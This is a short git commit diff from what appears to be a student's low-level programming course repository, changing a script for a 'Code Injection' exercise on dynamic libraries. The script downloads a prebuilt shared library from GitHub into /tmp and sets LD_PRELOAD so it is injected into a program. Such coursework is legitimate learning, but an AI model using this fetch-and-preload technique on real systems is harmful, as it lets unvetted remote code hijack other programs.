e65f03e0cf5a8f83273dc6f46a75fdfb26727a09
tok2fatsu <mailit2moi@gmail.com>
2022-09-05 15:18:35 -0700

    Task 3: Code Injection

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P .. https://github.com/tok2fatsu/alx-low_level_programming/blob/ff8e794f236d8786050ca8cb837c2526d18e2439/0x18-dynamic_libraries/libinject.so
-export LD_PRELOAD="$PWD/../libinject.so"
+wget -P /tmp https://github.com/tok2fatsu/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libinject.so
+export LD_PRELOAD=/tmp/libinject.so
